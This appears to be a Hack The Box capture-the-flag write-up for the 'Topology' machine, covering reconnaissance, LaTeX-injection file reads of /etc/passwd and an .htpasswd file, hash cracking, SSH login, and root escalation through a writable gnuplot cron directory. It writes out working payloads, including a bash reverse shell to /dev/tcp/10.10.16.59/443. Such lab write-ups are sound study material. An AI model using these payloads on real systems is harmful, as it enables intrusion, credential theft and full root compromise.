---
title: Topology
tags: HTB Latex gnuplot linux  
article_header:
  type: cover
published: true
author: krill
---


![](/images/HTB/topology/Topology.png)
<!--more-->

## Reconnaissance 
```
nmap -sCV 10.10.11.217 -T4 -oN map.txt  -Pn 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2023-01-17 12:26  demo/
[[about]]| 1.0K  2023-01-17 12:26  demo/fraction.png
| 1.1K  2023-01-17 12:26  demo/greek.png
| 1.1K  2023-01-17 12:26  demo/sqrt.png
| 1.0K  2023-01-17 12:26  demo/summ.png
| 3.8K  2023-01-17 12:26  equation.php
| 662   2023-01-17 12:26  equationtest.aux
| 17K   2023-01-17 12:26  equationtest.log
| 0     2023-01-17 12:26  equationtest.out
| 28K   2023-01-17 12:26  equationtest.pdf
|_
|_http-title: Index of /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Service Enumeration
```
[+] Port 22 
	Version: OpenSSH 8.2p1 
	Public-Exploit: None

	- I need some form of credentials to authenticate to this service which I don't have. 

[+] Port 80 
	Version: Apache httpd 2.4.41
	Public-Exploit: None 
	
	- Visiting the wepage
```
![](/images/HTB/topology/page.png)
```
	- Viewing the page source, I discovered a subdomain and added it to my `/etc/hosts` file. 
```
![](/images/HTB/topology/source.png)
```
		> echo '10.10.11.217  latex.topology.htb' | sudo tee -a /etc/hosts 
	
	[+] Subdomain Bruteforce
		 - Using ffuf to bruteforce for other virtual hosts
			 > ffuf -u http://topology.htb -w /words/big.txt  -t 30 -H 'HOST: FUZZ.topology.htb' -c -fs 6767
		
		- Discovered two other subdomains
```
![](/images/HTB/topology/result.png)
```
		- Add them to your /etc/hosts file 
		
		
	[+] latex.topology.htb 
		- Visiting http://latex.topology.htb/equation.php, you find a LaTeX Equation Generator.
```
![](/images/HTB/topology/lat.png)
```
		- Checking for related vulnerabilities and exploits, I found a cheatsheet on hacktricks that provided payloads for LaTeX Injection.

		- Using the following payload, I was able to read the /etc/passwd file;
			> $\lstinputlisting{/etc/passwd}$
```
![](images/HTB/topology/passwd.png)
```
		- From the /etc/passwd file, I discoverd a user `vdaisley`

	[+] dev.topology.hb
		- Visiting dev.topology.htb shows an http basic authentication.
```
![](/images/HTB/topology/basic.png)
```
		- Since this is http basic authentication, the credentials should be stored somewhere on the web server in a file called .htpasswd
		
		- Using the vulnerability discovered on the latex generator, we should be able to read that file. The question is, where exactly is this file. 

		- Remember the webserver is running apache, so we can check the `sites-enabled/000-default.conf` configuration file to get more information about the subdomains. 
			> $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
		
		- This displays information about the virtual hosts on the web-server
```
![](/images/HTB/topology/devroot.png)
```
		- The document root for dev is `/var/www/dev`, that means the credential to the http basic authentication should be stored in `/var/www/dev/.htpasswd`
			>  $\lstinputlisting{/var/www/dev/.htpasswd}$
```
![](/images/HTB/topology/creds.png)
```
		- You can use any online tool like google-image, to extract the text from the image. 
		  
	[+] Password Attack
		- Using john-the-ripper, you can crack this hash to get the clear-text password. 
			> john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
![](/images/HTB/topology/john.png)


## Initial Access 
```
	[+] SSH login 
		- Reusing the credentials, we gain access into the machine using ssh
			> sshpass -p calculus20 ssh vdaisley@topology.htb 
```


## Post Exploitation
```
[+] Privilege Escalation 

	[+] Automated tasks
		- Using pspy, which is a linux which allows you to see commands run by other users, cron jobs, etc. as they execute.  
```
![](/images/HTB/topology/pspy.png)
```
		- I  noticed the root user was using the find command to search for all .plt files in the /opt/gnuplot and running the gnuplot binary on each discoverd file.  
		- gnuplot is a command-line and GUI program that can generate two- and three-dimentional plots of functions, data, and data fits.


	[+] gnuplot Command Execution
		
		Since the gnuplot command is run by the root user, we should be able to get a reverse-shell as the root user.
		 
		- The script file of gnuplot can be used to execute system commands.
		  
		- Checking the permission of the /opt/gnuplot directory, we see that we have permissions to write into this directory 
```
![](/images/HTB/topology/gnuplot.png)
```		  
		- Create a new script.plt file in this directory with the following code. 
			> system " bash -c 'bash -i >& /dev/tcp/10.10.16.59/443 0>&1'"
			
		- Prepare a netcat listener to catch the reverse-shell connection
			> nc -lvnp 443
		
		- When the gnuplot binary is run again, you should get a root shell. 
```

_Sayonara~🍻_


[Hacktricks_link](https://book-hacktricks-xyz.translate.goog/pentesting-web/formula-doc-latex-injection?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-GB#latex-injection)
[gnuplot_command_execution](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/)
